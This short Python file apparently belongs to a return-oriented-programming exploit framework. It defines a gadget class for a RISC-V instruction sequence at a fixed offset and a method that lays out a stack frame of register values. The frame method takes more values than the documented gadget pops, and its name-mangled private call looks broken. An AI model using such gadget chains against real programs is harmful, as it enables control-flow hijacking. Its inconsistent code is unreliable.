from rop_gadgets import ROP_Gadget

class AndA3_S0(ROP_Gadget):
    '''
    and	a3, a3, s0
    ld ra, 0x18(sp)
    ld s0, 0x10(sp)
    ld s1, 0x8(sp)
    addi sp, sp, 0x20
    jr ra
    '''
    def __init__(self):
        super().__init__(0x224f0, 0x20)

    def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0, s4=0, s5=0, s6=0):
        data = [s6, s5, s4, s3, s2, s1, s0, ra]
        self.__set_stack_frame(data)